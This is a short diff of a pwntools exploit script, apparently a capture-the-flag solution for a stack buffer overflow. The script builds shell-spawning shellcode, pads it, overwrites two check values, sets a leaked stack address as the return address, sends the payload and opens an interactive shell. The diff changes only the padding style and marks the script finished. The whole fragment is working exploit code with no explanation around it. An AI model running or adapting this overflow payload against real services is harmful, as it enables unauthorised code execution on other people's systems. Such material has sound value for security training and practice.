@@ -12,12 +12,12 @@ log.info('stack: ' + hex(stack))
 shellcode = asm(shellcraft.sh())
 
 payload = shellcode 
-payload += b'a' * 232
+payload += 232 * b'A'
 payload += p32(0xdeadd00d)
 payload += p32(0xb16b00b5)
-payload += b'a' * 8 
+payload += 8 * b'A' 
 payload += p64(stack)
 
 p.sendline(payload)
 p.interactive()
-# NOT FINISHED
+#FINISHED
